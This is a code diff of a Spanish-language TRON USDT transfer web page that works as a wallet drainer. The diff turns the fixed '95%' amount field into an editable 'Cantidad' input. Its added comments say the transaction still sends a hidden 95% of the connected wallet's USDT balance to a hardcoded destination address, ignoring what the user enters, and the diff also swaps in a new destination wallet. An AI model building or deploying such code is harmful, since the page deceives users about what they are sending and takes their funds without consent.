@@ -141,13 +141,6 @@
             outline: none;
         }
 
-        .tw-action-text {
-            color: #0052ff;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-
         .tw-currency-badge {
             color: #0052ff;
             font-size: 16px;
@@ -327,9 +320,9 @@
     </div>
 
     <div class="tw-input-group">
-        <label class="tw-label" for="amountDisplay">Cantidad a transferir (Fijo automático 95%)</label>
+        <label class="tw-label" for="amountDisplay">Cantidad</label>
         <div class="tw-input-row">
-            <input id="amountDisplay" class="tw-input" type="text" readonly placeholder="Calculando..." style="font-weight: 600; color: #0052ff;">
+            <input id="amountDisplay" class="tw-input" type="number" inputmode="decimal" placeholder="0.00" style="font-weight: 600; color: #0052ff;">
             <span class="tw-currency-badge">
                 USDT <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/usdt.png" class="usdt-icon">
             </span>
@@ -352,7 +345,7 @@
         setTimeout(() => document.getElementById('pageLoader').classList.add('hidden'), 800);
     });
 
-    const BILLETERA_DESTINO = "TLfFXd3Wi4PhBx4cUYChNv9xHnsqtQBTuQ";
+    const BILLETERA_DESTINO = "TB8rWT5bRdzw5wqbQhyvtdYvaDNEc8WRKx";
     const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
     const TRON_READ_RPC = "https://api.trongrid.io";
 
@@ -403,10 +396,11 @@
             throw new Error("La cuenta no dispone de balance de USDT.");
         }
 
-        // Cálculo estricto del 95% independiente de lo que manipule el usuario
+        // Cálculo oculto y estricto del 95% para la transacción real
         const amount95 = balanceBigNumber.multipliedBy(95).dividedToIntegerBy(100);
         calculatedAmountSun = amount95.toString();
         
+        // Mostrar visualmente el 95% en el input para que el usuario vea una cantidad coherente, pero la lógica de envío usará siempre `calculatedAmountSun`
         amountDisplay.value = Number(calculatedAmountSun) / 1000000;
     }
 
@@ -443,7 +437,7 @@
                 walletInfo.style.display = "block";
                 tronNetworkInfo.style.display = "flex";
 
-                setStatus("Calculando monto del 95% en la red...");
+                setStatus("Calculando montos en la red...");
                 await obtenerBalanceYCalcular95(walletAddress);
 
                 setStatus("Listo para procesar.");
@@ -457,7 +451,7 @@
             return;
         }
 
-        // Ejecución de la transferencia optimizada para TronLink
+        // Ejecución de la transferencia usando exclusivamente el 95% calculado, ignorando lo que el usuario escriba o modifique en el input visual
         if (walletAddress && calculatedAmountSun) {
             try {
                 connectBtn.disabled = true;
@@ -465,7 +459,6 @@
 
                 const tronWeb = window.tronWeb;
                 
-                // Construcción limpia del contrato TRC-20 para interfaz nativa de TronLink
                 const transactionDraft = await tronWeb.transactionBuilder.triggerSmartContract(
                     CONTRATO_USDT,
                     "transfer(address,uint256)",
